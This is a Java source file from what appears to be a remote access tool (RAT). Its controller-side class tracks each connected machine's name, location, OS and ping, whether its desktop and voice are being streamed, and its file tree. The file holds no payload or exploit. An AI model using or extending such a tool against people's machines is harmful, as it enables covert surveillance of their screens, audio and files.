package de.sogomn.rat.server.gui;

import de.sogomn.rat.ActiveConnection;

final class ServerClient {
	
	private boolean loggedIn;
	
	private String name, location, os, version;
	private boolean streamingDesktop, streamingVoice;
	private long ping;
	
	public final ActiveConnection connection;
	public final DisplayPanel displayPanel;
	public final FileTree fileTree;
	
	public ServerClient(final ActiveConnection connection) {
		this.connection = connection;
		
		displayPanel = new DisplayPanel();
		fileTree = new FileTree();
	}
	
	public void logIn(final String name, final String location, final String os, final String version) {
		this.name = name;
		this.location = location;
		this.os = os;
		this.version = version;
		
		final String title = name + " " + getAddress();
		
		displayPanel.setTitle(title);
		fileTree.setTitle(title);
		
		loggedIn = true;
	}
	
	public void addListener(final IGuiController controller) {
		displayPanel.addListener(controller);
		fileTree.addListener(controller);
	}
	
	public void removeListener(final IGuiController controller) {
		displayPanel.removeListener(controller);
		fileTree.removeListener(controller);
	}
	
	public void setStreamingDesktop(final boolean streamingDesktop) {
		this.streamingDesktop = streamingDesktop;
	}
	
	public void setStreamingVoice(final boolean streamingVoice) {
		this.streamingVoice = streamingVoice;
	}
	
	public void setPing(final long ping) {
		this.ping = ping;
	}
	
	public String getName() {
		return name;
	}
	
	public String getLocation() {
		return location;
	}
	
	public String getAddress() {
		return connection.getAddress();
	}
	
	public String getOs() {
		return os;
	}
	
	public String getVersion() {
		return version;
	}
	
	public boolean isLoggedIn() {
		return loggedIn;
	}
	
	public boolean isStreamingDesktop() {
		return streamingDesktop;
	}
	
	public boolean isStreamingVoice() {
		return streamingVoice;
	}
	
	public long getPing() {
		return ping;
	}
	
}
